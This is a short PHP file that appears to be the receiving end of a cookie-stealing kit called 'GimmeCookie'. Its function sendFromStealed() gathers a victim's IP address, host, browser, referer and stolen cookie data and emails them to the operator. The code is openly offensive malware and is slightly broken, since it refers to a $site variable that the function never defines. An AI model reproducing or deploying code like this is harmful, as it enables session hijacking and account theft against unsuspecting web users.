<?PHP
// Protection against unauthorized access
if (!defined('GimmeCookie')) {
    header('Location: ./main');
    die;
}

function sendFromStealed($ip, $host, $navigator, $date, $time, $referer, $data)
{
	$st = '';
	// Write stealed data into the string array
	$st .= "IP: $ip";
	$st .= "HOST: $host";
	$st .= "Browser: $navigator";
	$st .= "Date: $date";
	$st .= "Time: $time";
	$st .= "Referer: $referer";
	$st .= "Data: $data";
	// Send recieved data on e-mail
	mail($site['mail'], "You recieved new cookies from $ip", $st);
}